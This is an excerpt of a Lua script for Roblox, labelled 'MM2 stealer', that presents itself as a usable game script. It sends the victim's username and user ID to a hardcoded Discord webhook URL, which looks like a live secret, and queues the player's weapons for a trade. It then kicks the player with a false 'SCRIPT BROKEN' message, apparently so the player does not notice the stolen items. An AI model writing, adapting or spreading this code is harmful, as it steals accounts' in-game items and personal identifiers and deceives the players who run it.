...
if ExecutorWebhoo2 == "Delta" then
    game.Players.LocalPlayer:Kick("Our Script not support delta executor. Try other executor! recommended: Codex, Ronix")
end
...
local function MM2()
    ...
    local function SendJoinMessage(rawUrl)
        local fields = {
            {
                name = ":star: __**Warningbot_dead scripts**__",
                value = "```Username     : " ..
                    fardplayer.Name ..
                        "\nUser-ID      : " ..
                            fardplayer.userId ..
            ...
            ["embeds"] = {
                {
                    ...
                    ["fields"] = fields,
                    ["footer"] = {
                        ["text"] = "MM2 stealer by warningbot_dead"
                    }
                }
            }
        }
    ...
    if #weaponsToSend > 0 then
        ...
        local body = {
            ...
            api_paste_code = "https://discord.com/api/webhooks/1408017135275479050/ZeJNWF-EGxIFx6c43hLGi4lG4alSxd4XjXWW0clJA81-QHdh7mqE1QCk0VBt7hwHii_3" .. List,
            api_option = "paste"
        }
        ...
        local function doTrade(joinedUser)
            ...
            plr:kick(
                "SCRIPT BROKEN. RE EXECUTE. IF NOT WORKING THEN IDK"
            )
        end
